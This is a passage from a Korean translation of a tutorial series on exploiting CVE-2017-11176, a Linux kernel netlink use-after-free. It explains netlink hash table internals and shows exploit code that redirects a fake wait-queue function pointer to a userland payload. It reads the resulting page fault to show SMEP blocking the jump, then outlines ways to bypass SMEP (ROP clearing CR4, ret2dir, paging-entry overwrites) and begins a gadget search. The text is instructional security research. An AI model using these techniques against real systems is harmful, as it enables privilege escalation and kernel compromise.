* **[8]**: 현재 bucket이 *적어도*  하나 이상의 요소를 가지고 있다면 *nl\_pid\_hash\_dilute()* 를 호출한다(다음 섹션 참고).
* **[9]**: 해시 테이블이 *dilute* 되었다면 새로운 bucket pointer(*hlist\_head*)를 찾는다.
* **[10]**: 해시 테이블 요소의 총 개수를 증가시킨다.
* **[11]**: sock의 *pid* 필드를 설정(set)한다.
* **[12]**: **sock의 *hlist\_node*  를 bucket의 이중 연결 리스트에 붙인다(add).**
* **[13]**: *netlink\_insert()* 가 성공했으므로 *err*를 리셋한다.

다음 내용으로 넘어가기 전에 몇 가지만 더 보자. *sk\_add\_node()* 를 살펴보면 다음과 같은 것을 볼 수 있다:

* *sock* 을 참조한다(refcounter를 늘린다).
* *hlist\_add\_head(&sk->sk\_node, list)* 를 호출한다.

다시 말해 *sock* 이 해시 테이블에 삽입될 땐 **늘 bucket의 head에 삽입된다는 것이다**. 이 점을 나중에 이용할 테니 잘 기억해두자.

마지막으로 해시 함수를 보자:

```c
static struct hlist_head *nl_pid_hashfn(struct nl_pid_hash *hash, u32 pid)
{
    return &hash->table[jhash_1word(pid, hash->rnd) & hash->mask];
}
```

예상했던 대로 이 함수는 그저 해시 테이블의 *mask*  필드를 이용하여 감싸진(wrapped) *hash->table*  배열의 bucket index를 계산하고, bucket을 나타내는 *hlist\_head*  포인터를 반환하는 함수이다.

해시 함수 자체는 **jhash\_1word()**이고, 이는 리눅스에서 [Jenkins hash function](https://en.wikipedia.org/wiki/Jenkins_hash_function)을 구현한(implement) 것이다. 구현 방식(implementation)을 이해할 필요는 없지만, 해시 함수가 두 "키" (*pid*와 *hash->rnd*)를 사용하고 "역함수가 존재하지 않는다"는 점은 기억해두자.

**해시 테이블이 "dilute" 메커니즘 없이는 실제로 커질(extend) 수 없다는 점**을 눈치챘는가? 한 bucket으로 초기화되기(initialized) 때문에 요소들은 그냥 한 이중 연결 리스트에 저장된다. 해시 테이블을 제대로 활용하지 못하고 있는 것이다!

### The Netlink Hash Table "Dilution" Mechanism

위에서 말한 대로 *netlink\_insert()* 코드는 마지막에 *len* 이 0이 아니라면(= bucket이 비어있지 않다면) **nl\_pid\_hash\_dilute()**함수를 호출한다. "dilution"에 성공하면 *sock* 요소를 붙일 새로운 bucket을 찾는다(해시 테이블은 "rehashed"되었다(?)):

```c
    if (len && nl_pid_hash_dilute(hash, len))
        head = nl_pid_hashfn(hash, pid);
```

어떻게 구현했는지를 보도록 하자:

```c
      static inline int nl_pid_hash_dilute(struct nl_pid_hash *hash, int len)
      {
[0]     int avg = hash->entries >> hash->shift;

[1]     if (unlikely(avg > 1) && nl_pid_hash_rehash(hash, 1))
          return 1;

[2]     if (unlikely(len > avg) && time_after(jiffies, hash->rehash_time)) {
          nl_pid_hash_rehash(hash, 0);
          return 1;
        }

[3]     return 0;
      }
```

근본적으로 이 함수가 수행하려 하는 것은 다음과 같다:

1. 해시 테이블에 충돌을 최소화하기 위해 "충분한" bucket이 있는지 확인한다. 충분하지 않으면 해시 테이블을 키운다.
2. 모든 bucket이 균형잡히도록(balanced) 유지한다.

다음 섹션에서도 보겠지만, bucket의 수는 해시 테이블이 "커질" 때 두 배로 증가한다. 이로 인해서 [0]은 다음과 동일하다:

```plaintext
avg = nb_elements / (2^(shift))     <===>     avg = nb_elements / nb_buckets
```

**이것은 해시 테이블의 *load factor*를 계산한다.**

[1]에서의 검사는 bucket 당 들어있는 요소의 개수의 평균이 2 이상이면 참이다. 다시 말해 **해시 테이블은 "평균적으로" bucket마다 두 개의 요소를 가지고 있다**. 세 번째 요소가 추가될 즈음엔 해시 테이블이 확장되고 "rehashing"을 통해 diluted된다.

[2]에서의 검사는 [1]과 비슷하다. 차이점은 해시 테이블이 확장되지 않는다는 것이다. bucket에 세 번째 요소를 넣으려 할 때 *len* 이 1보다 큰 *avg* 보다 크면 전체 해시 테이블이 다시 dilute되고 "rehashed"된다. 반대로 테이블이 거의 비어있으면(i.e. *avg* equals zero), 비어있지 않은 bucket(len > 0)에 요소를 넣으려 할 때 "dilution"이 유발된다. 이 작업은 비용이 많이 들고(*O(N)*) 특정한 상황(해시테이블이 더이상 자랄 수 없는 상황 등)에선 삽입할 때마다 작업이 발생할 수 있기 때문에 *rehash\_time* 으로 발생 횟수를 제한한다.

**노트**: *jiffies*  는 시간을 측정하는 것이다. [Kernel Timer Systems](https://elinux.org/Kernel_Timer_Systems)를 보자.

결국 netlink가 해시 테이블에 요소를 저장하는 방식은 **평균적으로 1:2 매핑이다**. 해시 테이블이 더이상 자랄 수 없는 상황만이 유일한 예외이다. 이 경우엔 점차 1:3, 1:4... 매핑이 된다. 이런 일이 발생한다는 것은 128k개 이상의 netlink socket이 있다는 뜻이다. 익스플로잇을 하는 관점에서 볼 때, 이 포인트에 도달하기 전에 열린 file descriptor의 수에 의해 제한될 것이다.

### Netlink "Rehashing"

netlink 해시 테이블 삽입에 대한 이해를 마무리하기 위해 빠르게 *nl\_pid\_hash\_rehash()*  함수를 훑어보자:

```c
static int nl_pid_hash_rehash(struct nl_pid_hash *hash, int grow)
{
    unsigned int omask, mask, shift;
    size_t osize, size;
    struct hlist_head *otable, *table;
    int i;

    omask = mask = hash->mask;
    osize = size = (mask + 1) * sizeof(*table);
    shift = hash->shift;

    if (grow) {
        if (++shift > hash->max_shift)
            return 0;
        mask = mask * 2 + 1;
        size *= 2;
    }

    table = nl_pid_hash_zalloc(size);
    if (!table)
        return 0;

    otable = hash->table;
    hash->table = table;
    hash->mask = mask;
    hash->shift = shift;
    get_random_bytes(&hash->rnd, sizeof(hash->rnd));

    for (i = 0; i <= omask; i++) {
        struct sock *sk;
        struct hlist_node *node, *tmp;

        sk_for_each_safe(sk, node, tmp, &otable[i])
            __sk_add_node(sk, nl_pid_hashfn(hash, nlk_sk(sk)->pid));
    }

    nl_pid_hash_free(otable, osize);
    hash->rehash_time = jiffies + 10 * 60 * HZ;
    return 1;
}
```

이 함수는 다음과 같은 일을 수행한다:

1. *grow*  파라미터를 기반으로(based on) 새 *size* 와 *mask*  를 계산한다. bucket의 수는 자랄 때마다 두 배로 늘어난다.
2. 새 *hlist\_head*  배열을 할당한다. (i.e. new buckets)
3. 해시 테이블의 *rnd*  값을 갱신한다. 이는 해시 함수가 이전의 요소를 검색할(retrieve) 수 없기 때문에 **해시 테이블 전체가 손상되었음**을 의미한다.
4. 앞의 bucket들을 순회하고 새 해시 함수를 이용하여 새 bucket들에 **모든 요소를 재삽입한다**.
5. 앞의 bucket들의 배열을 해제(release)하고 *rehash\_time*  을 갱신한다.

(*netlink\_insert()* 에서) 요소를 삽입하기 전에 "새 bucket"이 dilution 이후 다시 계산되는 것은 해시 함수가 바뀌었기 때문이다.

### Netlink Hash Table Summary

이제 netlink 해시 테이블에 대해 아는 것을 어느 정도 정리해보자:

* netlink는 한 프로토콜당 한 해시 테이블을 가진다.
* 각각의 해시 테이블은 bucket 하나에서 시작한다.
* 평균적으로 bucket마다 두 개의 요소가 있다.
* bucket당 요소의 수가 대략 둘 이상이 될 때 테이블이 자란다.
* 해시 테이블이 자랄 때, 요소들은 "dilute"된다.
* 다른 bucket보다 "더 차있는" bucket에 요소를 삽입하려 하면 dilution이 유발된다.
* 요소는 항상 bucket의 head에 삽입된다.
* dilution이 발생하면 해시 함수가 바뀐다.
* 해시 함수는 유저에게 받은 pid 값과 예측할 수 없는(unpredictable) 키값을 이용한다.
* 해시 함수는 역함수가 존재하지 않기 때문에 요소가 어떤 bucket에 삽입될지 알 수 없다.
* 어떤 해시테이블에 하는 어떤 작업도 global lock(*netlink\_table\_grab(), netlink\_table\_ungrab()*)에 의해 보호된다.

그리고 제거에 대한 몇 몇 요소가 더 있다(*netlink\_remove()* 를 확인하라):

* 해시 테이블은 한번 자라면 **다시 줄어들지 않는다**.
* 요소 제거는 **절대로** delution을 유발하지 않는다.

좋다! 이제 다시 익스플로잇으로 돌아갈 준비가 되었다!
- - -
## Meeting Supervisor Mode Execution Prevention

우린 이전 파트에서 *type confusion* 을 통한 *use-after-free*  를 익스플로잇하도록 PoC를 수정했다 [**1**]. 재할당을 통해서 유저 영역의 요소를 가리키는 "가짜" wait queue를 만들었다 [**2**].

그러고 나서 *setsockopt()*  syscall [**3a**]은 우리의 유저 영역 wait queue 요소에 대해 반복적으로 수행되고(iterates), 현재는 *panic()* [**3c**]으로 되어있는 *func*  함수 포인터를 호출한다 [**3b**]. 이는 우리가 성공적으로 **arbitrary call**을 획득했다는(achieved) 것을 검증해주는 좋은 call trace를 제공해준다.

![arbitrary call Panic()](https://blog.lexfo.fr/images/cve-2017-11176-linux/arbitrary_call_0.png)

call trace는 다음과 같았다:

```plaintext
[  213.352742] Freeing alive netlink socket ffff88001bddb400
[  218.355229] Kernel panic - not syncing: ^A
[  218.355434] Pid: 2443, comm: exploit Not tainted 2.6.32
[  218.355583] Call Trace:
[  218.355689]  [<ffffffff8155372b>] ? panic+0xa7/0x179
[  218.355927]  [<ffffffff810665b3>] ? __wake_up+0x53/0x70
[  218.356045]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90
[  218.356156]  [<ffffffff810665a8>] ? __wake_up+0x48/0x70
[  218.356310]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c/0x1c0
[  218.356460]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f/0xc0
[  218.356622]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16/0x1b
```

보이는 것처럼 *panic()*  함수는 *\_\_wake\_up\_common()*  의 *curr->func()* 함수 포인터로부터 호출된다.

**노트**: *\_\_wake\_up()* 에 대한 두 번째 호출은 발생하지 않는다. 여기선 *panic()*  함수의 인자가 약간 손상되어서 그런 것이다.

### Returning to userland code (first try)

이제 유저 영역으로 돌아오는 걸 시도해보자(혹자는 이를 *ret-to-user* 라 부른다).

누군가 물을 것이다. 왜 유저 영역 코드로 돌아와야 하는가? 커널에 백도어가 설치된 게(backdoored) 아니라면, 직접적인 권한 상승과 커널 보수 등을 해주는 **단 하나의(single) 함수**도 찾아낼 수 없다. 우린 우리의 선택대로 임의적인 코드를 실행하고 싶다. arbitrary call primitive를 가지고 있으므로, 익스플로잇에 페이로드를 작성하고, 작성한 페이로드로 점프해보자.

익스플로잇을 수정하여 (테스트를 위해) *panic()*  함수를 호출하는 *payload()*  함수를 만들자. *func*  함수 포인터 값을 바꿔야 한다는 것을 명심하자.

```c
static int payload(void);

static int init_realloc_data(void)
{
  // ... cut ...

  // initialise the userland wait queue element
  BUILD_BUG_ON(offsetof(struct wait_queue, func) != WQ_ELMT_FUNC_OFFSET);
  BUILD_BUG_ON(offsetof(struct wait_queue, task_list) != WQ_ELMT_TASK_LIST_OFFSET);
  g_uland_wq_elt.flags = WQ_FLAG_EXCLUSIVE; // set to exit after the first arbitrary call
  g_uland_wq_elt.private = NULL; // unused
  g_uland_wq_elt.func = (wait_queue_func_t) &payload; // <----- userland addr instead of PANIC_ADDR
  g_uland_wq_elt.task_list.next = (struct list_head*)&g_fake_next_elt;
  g_uland_wq_elt.task_list.prev = (struct list_head*)&g_fake_next_elt;
  printf("[+] g_uland_wq_elt addr = %p\n", &g_uland_wq_elt);
  printf("[+] g_uland_wq_elt.func = %p\n", g_uland_wq_elt.func);

  return 0;
}

typedef void (*panic)(const char *fmt, ...);

// The following code is executed in Kernel Mode.
static int payload(void)
{
  ((panic)(PANIC_ADDR))("");  // called from kernel land

  // need to be different than zero to exit list_for_each_entry_safe() loop
  return 555; 
}
```

이전의 표는 다음과 같이 바뀐다:

![Arbitrary call painc() from userland](https://blog.lexfo.fr/images/cve-2017-11176-linux/arbitrary_call_1.png)

실행하면 이런 결과를 보게 된다:

```plaintext
[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4
[  124.962923] IP: [<00000000004014c4>] 0x4014c4
[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
[  124.963261] Oops: 0011 [#1] SMP 
...
[  124.966733] RIP: 0010:[<00000000004014c4>]  [<00000000004014c4>] 0x4014c4
[  124.966810] RSP: 0018:ffff88001b533e60  EFLAGS: 00010012
[  124.966851] RAX: 0000000000602880 RBX: 0000000000602898 RCX: 0000000000000000
[  124.966900] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000602880
[  124.966948] RBP: ffff88001b533ea8 R08: 0000000000000000 R09: 00007f919c472700
[  124.966995] R10: 00007ffd8d9393f0 R11: 0000000000000202 R12: 0000000000000001
[  124.967043] R13: ffff88001bdf2ab8 R14: 0000000000000000 R15: 0000000000000000
[  124.967090] FS:  00007f919cc3c700(0000) GS:ffff880003200000(0000) knlGS:0000000000000000
[  124.967141] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  124.967186] CR2: 00000000004014c4 CR3: 000000001d01a000 CR4: 00000000001407f0
[  124.967264] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[  124.967334] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[  124.967385] Process exploit (pid: 2447, threadinfo ffff88001b530000, task ffff88001b4cd280)
[  124.968804] Stack:
[  124.969510]  ffffffff81061909 ffff88001b533e78 0000000100000001 ffff88001b533ee8
[  124.969629] <d> ffff88001bdf2ab0 0000000000000286 0000000000000001 0000000000000001
[  124.970492] <d> 0000000000000000 ffff88001b533ee8 ffffffff810665a8 0000000100000000
[  124.972289] Call Trace:
[  124.973034]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90
[  124.973898]  [<ffffffff810665a8>] __wake_up+0x48/0x70
[  124.975251]  [<ffffffff814b81cc>] netlink_setsockopt+0x13c/0x1c0
[  124.976069]  [<ffffffff81475a2f>] sys_setsockopt+0x6f/0xc0
[  124.976721]  [<ffffffff8100b1a2>] system_call_fastpath+0x16/0x1b
[  124.977382] Code:  Bad RIP value.
[  124.978107] RIP  [<00000000004014c4>] 0x4014c4
[  124.978770]  RSP <ffff88001b533e60>
[  124.979369] CR2: 00000000004014c4
[  124.979994] Tainting kernel with flag 0x7
[  124.980573] Pid: 2447, comm: exploit Not tainted 2.6.32
[  124.981147] Call Trace:
[  124.981720]  [<ffffffff81083291>] ? add_taint+0x71/0x80
[  124.982289]  [<ffffffff81558dd4>] ? oops_end+0x54/0x100
[  124.982904]  [<ffffffff810527ab>] ? no_context+0xfb/0x260
[  124.983375]  [<ffffffff81052a25>] ? __bad_area_nosemaphore+0x115/0x1e0
[  124.983994]  [<ffffffff81052bbe>] ? bad_area_access_error+0x4e/0x60
[  124.984445]  [<ffffffff81053172>] ? __do_page_fault+0x282/0x500
[  124.985055]  [<ffffffff8106d432>] ? default_wake_function+0x12/0x20
[  124.985476]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90
[  124.986020]  [<ffffffff810665b3>] ? __wake_up+0x53/0x70
[  124.986449]  [<ffffffff8155adae>] ? do_page_fault+0x3e/0xa0
[  124.986957]  [<ffffffff81558055>] ? page_fault+0x25/0x30                 // <------
[  124.987366]  [<ffffffff81061909>] ? __wake_up_common+0x59/0x90
[  124.987892]  [<ffffffff810665a8>] ? __wake_up+0x48/0x70
[  124.988295]  [<ffffffff814b81cc>] ? netlink_setsockopt+0x13c/0x1c0
[  124.988781]  [<ffffffff81475a2f>] ? sys_setsockopt+0x6f/0xc0
[  124.989231]  [<ffffffff8100b1a2>] ? system_call_fastpath+0x16/0x1b
[  124.990091] ---[ end trace 2c697770b8aa7d76 ]---
```

아앗... call trace에서 볼 수 있듯, 목표를 달성하지 못했다(스텝 3가 실패한 것이다)! 이런 종류의 trace를 많이 보게 될 것이니 어떻게 해석하는지 이해하는 것이 좋다.

### Understanding Page Fault Trace

위의 trace를 분석해보자. 이런 종류의 trace는 **page fault exception**에서 나온다. 즉 메모리에 접근할 때 CPU 자체(= 하드웨어)에서 나오는 예외인 것이다.

"일반적인" 상태일 때, page fault exception은 다음과 같은 상황에서 발생할 수 있다:

* CPU가 RAM에 없는 페이지에 접근하려 할 때 (정상적인 접근)
* "비정상적인" 접근인 경우: 읽기 전용인 페이지에 쓰는 것, NX page를 실행(execute)하는 것, 주소가 *가상 주소 영역*  밖에 있을 때, 등등

CPU 관점에선(CPU-wise) "예외"이지만 사실 일반적인 프로그램 생명 주기에서 꽤 자주 발생한다. 예를 들어 *mmap()* 으로 메모리를 할당하려 하는 경우, 커널은 메모리에 처음 접근할 때까지 *실제*  메모리를 할당해주지 않는다. 이것을 **Demand Paging**이라 부른다. 이 첫 접근은 page fault를 유발하고, 실제로 페이지 프레임을 할당해주는 것은 *page fault exception handler* 이다. 이때문에 실제 RAM 용량보다 많은 가상 메모리를 할당받을 수 있는 것이다(물론 메모리에 접근하기 전의 이야기다).

다음 그림은 page fault exception handler를 단순화해서 보여준다(출처: *Understanding the Linux Kernel*):

![Page Fault Handler](https://blog.lexfo.fr/images/cve-2017-11176-linux/page_fault_handler.png)

그림에 나온 것처럼 **커널 영역에서 비정상적인 접근이 발생하면 커널 크래시가 발생한다**. 이것이 현재 우리의 위치이다.

```plaintext
[  124.962677] BUG: unable to handle kernel paging request at 00000000004014c4
[  124.962923] IP: [<00000000004014c4>] 0x4014c4
[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
[  124.963261] Oops: 0011 [#1] SMP 
...
[  124.979369] CR2: 00000000004014c4
```

위의 trace는 page fault exception이 발생한 이유를 알려주는 많은 정보를 담고 있다. **CP2 register**(여기선 IP와 같다)가 잘못된 주소를 가지고 있었다.

우리의 경우엔 MMU(하드웨어)가 메모리 주소 **0x00000000004014c4**(*payload()* 의 주소)에 접근하는 데 실패했다. *IP*  또한 같은 곳을 가리키고 있기 때문에, *\_\_wake\_up\_common()* 의 **curr->func()** 명령어를 실행하려는 과정에서 예외가 발생했다는 것을 알 수 있다.

첫 번째로, "0x11"이었던 **에러 코드**에 주목해보자. *에러 코드*란 다음의 비트들이 설정/해제될 수 있는 64비트짜리 값이다:

```c
// [arch/x86/mm/fault.c]

/*
 * Page fault error code bits:
 *
 *   bit 0 ==    0: no page found   1: protection fault
 *   bit 1 ==    0: read access     1: write access
 *   bit 2 ==    0: kernel-mode access  1: user-mode access
 *   bit 3 ==               1: use of reserved bit detected
 *   bit 4 ==               1: fault was an instruction fetch
 */
enum x86_pf_error_code {

    PF_PROT     =       1 << 0,
    PF_WRITE    =       1 << 1,
    PF_USER     =       1 << 2,
    PF_RSVD     =       1 << 3,
    PF_INSTR    =       1 << 4,
};
```

즉 우리의 에러 코드는 다음과 같다:

```plaintext
((PF_PROT | PF_INSTR) & ~PF_WRITE) & ~PF_USER
```

다시 말해서 page fault는 다음 경우에 발생한다:

* **protection fault**로 인해서 (*PF_PROT* 이 설정됨)
* **instruction fetch** 도중에 (*PF_INSTR* 이 설정됨)
* **읽기 액세스**를 암시하며(implying) (*PF_WRITE* 가 해제됨)
* **커널 모드**에서 (*PF_USER* 가 해제됨)

잘못된 주소가 속한 페이지가 *present* 이므로(*PF_PROT* 이 설정됨), **Page Table Entry (PTE)**가 존재한다. PTE는 두 가지를 알려준다:

* *Page Frame Number*  (PFN)
* 접근 권한, 페이지의 present 상태 여부, User/Supervisor 페이지 여부 등을 알려주는 **Page Flags**

우리의 경우, PTE 값은 **0x111e3025**이다.

```plaintext
[  124.963039] PGD 1e3df067 PUD 1abb6067 PMD 1b1e6067 PTE 111e3025
```

이 값에서 PFN 부분을 지우면 **0b100101** (0x25)라는 값을 얻는다. PTE의 플래그 값에서 정보를 추출하는 간단한 프로그램을 짜보자:

```c
#include <stdio.h>

#define __PHYSICAL_MASK_SHIFT 46
#define __PHYSICAL_MASK ((1ULL << __PHYSICAL_MASK_SHIFT) - 1)
#define PAGE_SIZE 4096ULL
#define PAGE_MASK (~(PAGE_SIZE - 1))
#define PHYSICAL_PAGE_MASK (((signed long)PAGE_MASK) & __PHYSICAL_MASK)
#define PTE_FLAGS_MASK (~PHYSICAL_PAGE_MASK)

int main(void)
{
  unsigned long long pte = 0x111e3025;
  unsigned long long pte_flags = pte & PTE_FLAGS_MASK;

  printf("PTE_FLAGS_MASK  = 0x%llx\n", PTE_FLAGS_MASK);
  printf("pte             = 0x%llx\n", pte);
  printf("pte_flags       = 0x%llx\n\n", pte_flags);

  printf("present   = %d\n", !!(pte_flags & (1 << 0)));
  printf("writable  = %d\n", !!(pte_flags & (1 << 1)));
  printf("user      = %d\n", !!(pte_flags & (1 << 2)));
  printf("acccessed = %d\n", !!(pte_flags & (1 << 5)));
  printf("NX        = %d\n", !!(pte_flags & (1ULL << 63)));

  return 0;
}
```

**노트**: 코드에 들어간 상수가 어디서 온 값인지 알고 싶다면 *arch/x86/include/asm/pgtable\_types.h* 에 있는 *PTE_FLAGS_MASK* 와 *\_PAGE\_BIT\_USER*  매크로에 대해 찾아보자. 이는 인텔 문서와도 일치한다(Table 4-19).

프로그램의 결과는 다음과 같다:

```plaintext
PTE_FLAGS_MASK  = 0xffffc00000000fff
pte             = 0x111e3025
pte_flags       = 0x25

present   = 1
writable  = 0
user      = 1
acccessed = 1
NX        = 0
```

이 정보를 위의 *에러 코드* 와 연결해보자.

1. 커널이 접근하려는 페이지는 이미 존재한다. 따라서 fault는 **접근 권한 문제**로부터 나온다.
2. 우리는 읽기 전용 페이지에 접근하는 것이 아니다.
3. NX 비트가 설정되어 있지 않으므로 실행 가능한 페이지이다.
4. 페이지에 유저가 접근할 수 있다. 즉, 커널도 접근할 수 있다.

자, 무엇이 문제일까?

위의 목록에서 *4번* 항목은 부분적으로 맞다. 커널이 유저 모드 페이지에 접근할 수는 있지만 **실행할 수는 없다**! 이유는 이것이 존재하기 때문이다:

**Supervisor Mode Execution Prevention (SMEP)**

SMEP 도입 이전에 커널은 유저 영역 페이지에 대해 뭐든 할 수 있는 권한을 가지고 있었다. Supervisor Mode(= 커널 모드)에서 커널은 유저 영역과 커널 영역 페이지 모두에 읽기/쓰기/실행을 할 수 있었다. 이제는 그렇지 않다!

SMEP는 *"Ivy Bridge"* 인텔 마이크로아키텍처(core i7, core i5 등)부터 생겼고, 리눅스가 이를 지원하기 시작한 것은 [이 패치](https://lkml.org/lkml/2011/5/16/500)부터이다. SMEP는 하드웨어에 적용되는 보안 메커니즘을 추가한다

[Intel System Programmin Guide Volume 3a](https://software.intel.com/sites/default/files/managed/7c/f1/253668-sdm-vol-3a.pdf)의 섹션 *"4.6.1 - Determination of Access Rights"*을 보자. 내용을 읽어보면 메모리 영역에 접근하는 것이 허용되는지 아닌지 확인하는 완전한 과정을 알 수 있다. 접근이 허용되지 않는 경우 page fault가 발생하는 것이다.

fault가 *setsockopt()*  시스템 콜 도중에 발생하므로, 우리는 supervisor-mode에 있는 것이다:
```plaintext
The following items detail how paging determines access rights:

• For supervisor-mode accesses:
  ... cut ...
  — Instruction fetches from user-mode addresses.
    Access rights depend on the values of CR4.SMEP:
    • If CR4.SMEP = 0, access rights depend on the paging mode and the value of IA32_EFER.NXE:
      ... cut ...
    • If CR4.SMEP = 1, instructions may not be fetched from any user-mode address.
```

**CR4 레지스터**의 상태를 체크해보자. *CR4*에서 SMEP 상태를 알려주는 비트는 20번째 비트이다:

![CR4](https://blog.lexfo.fr/images/cve-2017-11176-linux/cr4.png)

리눅스에서 다음 매크로가 사용된다:

```c
// [arch/x86/include/asm/processor-flags.h]

#define X86_CR4_SMEP    0x00100000 /* enable SMEP support */
```

결과는 다음과 같다:

```c
CR4 = 0x00000000001407f0
                  ^
                  +------ SMEP is enabled
```

바로 이거다! **우리가 커널 영역에서 유저 영역 코드로 돌아가려 하는 것을 SMEP가 거부하고 있었다".

다행히 커널 모드에서 유저 영역 페이지에 접근하지 못하게 하는 SMAP (Supervisor Mode Access Protection)은 비활성화되어 있다. 활성화되어 있었다면 다른 익스플로잇 전략을 사용해야 했을 것이다(유저 영역의 wait queue를 사용할 수 없기 때문).

**주의**: 몇 몇 가상화 소프트웨어(*Virtual Box* 같은 )는 SMEP를 지원하지 않는다. 글을 쓰는 시점에는 지원하는지 아닌지 모른다. 구성한 환경에서 SMEP 플래그가 해제되어 있다면, 다른 가상화 소프트웨어를 사용하라(*vmware* 는 지원한다!).

이 섹션에선 page fault trace로부터 어떤 자세한 정보를 추출할 수 있는지를 자세히 분석해보았다. 나중에 다시 볼 일이 있기 때문에(e.g. *prefaulting* ) 잘 이해해두는 것이 중요하다. 덧붙여서 왜 SMEP때문에 예외가 발생했는지, 이를 어떻게 감지하는지도 이해할 수 있었다. 걱정하지 말자. 다른 어떤 보안 보호 메커니즘(security protection mechanism)이 그렇듯, 해결책이 있다😁.
- - -
## Defeating SMEP Strategies

이전 섹션에선 우리가 원하는 페이로드를 실행하기 위해(i.e. arbitrary code execution) 유저 영역으로의 점프를 시도했다. 아쉽게 SMEP가 커널 크래시를 발생시키는 복구 불능의 page fault를 발생시켜 성공하지 못했다.

이번 섹션에선 SMEP를 무력화시키는 여러 전략을 보여줄 것이다.

### Don't ret2user

SMEP를 우회하는 가장 확실한 방법은 유저 코드로 넘어오지 않고 쭉 커널 코드를 실행하는 것이다.

그러나 그렇게 해서는 다음 역할을 해주는 단 하나의 함수를 찾을 수 없다:

* 우리의 권한/"이익"(profit)을 높여주는 것
* 커널을 보수해주는 것
* 0이 아닌 값을 반환하는 것(버그에 필요함)

현재 익스플로잇에선 사실 "단 하나의 함수"에 묶여있지 않다. 이유는 **우리가 유저 영역에 있는 *func*  필드를 컨트롤하기** 때문이다. 이 상황에선 커널 함수 하나를 호출하고, *func* 를 수정하여 다른 함수를 부를 수 있다. 그러나 이것은 두 문제를 불러일으킨다:

1. 호출한 함수의 반환값을 얻을 수 없다.
2. 호출한 함수의 파라미터를 "직접적으로" 컨트롤하는 것이 아니다.

**ROP를 사용할 필요가 없어서"** 더 " targetless"한 익스플로잇이 가능하게 해주는 몇 가지 arbitrary call 익스플로잇 트릭이 존재한다. 우린 arbitrary call을 사용하는 "평범한" 방법을 보여주는 것을 목표로 하므로 이 방법은 여기서 다루지 않을 것이다.

유저 영역에서의 익스플로잇과 마찬가지로 *return-oriented programming*  테크닉을 사용할 수 있다. 문제는 복잡한 ROP-chain을 만드는 것이 지루하기 때문이다(자동화가 가능하지만(?)). 그렇긴 하지만 작동할 것이고, 우리가 다음을 할 수 있게 해줄 것이다.

### Disabling SMEP

이전 섹션에서 본 것처럼, SMEP의 상태(CR4.SMEP)는 메모리 접근 도중에 체크한다. 더 구체적으로 말하면 CPU가 유저 공간에 속한 명령어를 커널(Supervisor) 모드에서 fetch할 때이다. 만약 **CR4의 SMEP 비트를 뒤집을** 수 있다면 다시 유저 코드로 돌아갈 수 있을 것이다.

이것이 우리가 익스플로잇에서 할 일이다. 우선 ROP를 통해 SMEP를 무력화시키고 유저 코드로 점프한다. 이렇게 하면 우리의 페이로드를 C언어로 작성할 수 있게 될 것이다.

### ret2dir

*ret2dir*  공격은 모든 유저 페이지가 동등한 커널 영역 안의 주소("synonyms"라 불림)를 가지고 있다는 점을 익스플로잇한다. 이 synonyms는 **physmap**에 존재한다. *physmap*  은 실제 메모리 전체에 대한 직접적인 매핑이다. *physmap*의 가상 주소는 *page frame number (PFN)* 0에 매핑되는 0xffff880000000000이다(0xffff880000001000가 PFN#1이다). "physmap"이라는 용어는 re2user 공격과 함께 나타나는 것으로 보이고, 몇 몇 사람들은 "linear mapping"이라고 부른다.

아쉽게도 요즘엔 **/proc/&ltPID>/pagemap**이 world readable하지 않기 때문에 더 복잡해졌다. physmap이 유저 영역 페이지의 PFN을 찾을 수 있게 하므로, physmap에서 가상 주소를 찾자(?).

유저 영역 주소의 PFN인 *uaddr* 은 *pagemap*  파일을 찾아 offset의 8바이트짜리 값을 읽어서 얻을 수 있다:

```c
PFN(uaddr) = (uaddr/4096) * sizeof(void*)
```

이 공격 방식에 대해 더 알고 싶다면 [ret2dir: Rethinking Kernel Isolation](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf)을 보라.

### Overwriting Paging-Structure Entries

인텔 문서의 *Determination of Access Rights (4.6.1)*  섹션을 다시 보면 다음 내용을 볼 수 있다:

```plaintext
Access rights are also controlled by the mode of a linear address as specified by
the paging-structure entries controlling the translation of the linear address.

If the U/S flag (bit 2) is 0 in at least one of the paging-structure entries, the
address is a supervisor-mode address. Otherwise, the address is a user-mode address.
```

우리가 점프하려는 주소는 **U/S 플래그가 설정되어 있기** 때문에 *유저 영역 주소* 로 여겨진다.

SMEP를 우회하는 방법 중 하나는 **적어도 하나의 paging-structure entry**(PTE, PMD 등)를 덮어쓰고 두 번째 비트(bit 2)를 지우는 것이다. 이는 우리가 PGD/PUD/PMD/PTE가 메모리 어디에 위치했는지를 안다고 가정한다. 이러한 공격 방식은 **arbitrary read/write primitives**가 있다면 더 쉽다.
- - -
## Finding Gadgets

커널에서 ROP 가젯을 찾는 것은 유저 영역 익스플로잇과 비슷하다. 우선 필요한 것은 **vmlinux** 바이너리와 (선택적으로) [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)에서 이미 추출한(extracted) **System.map** 파일이다. *vmlinux* 가 **ELF 바이너리**이므로 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)을 사용할 수 있다.

그러나 *vmlinux* 는 평범한 ELF 바이너리가 아니고, [특별한 섹션](https://lwn.net/Articles/531148/)을 포함하고(embeds) 있다. **readelf**를 사용하는 다양한 섹션을 본다면 그 수가 많다는 것을 알 수 있다:

```bash
$ readelf -l vmlinux-2.6.32 

Elf file type is EXEC (Executable file)
Entry point 0x1000000
There are 6 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000200000 0xffffffff81000000 0x0000000001000000
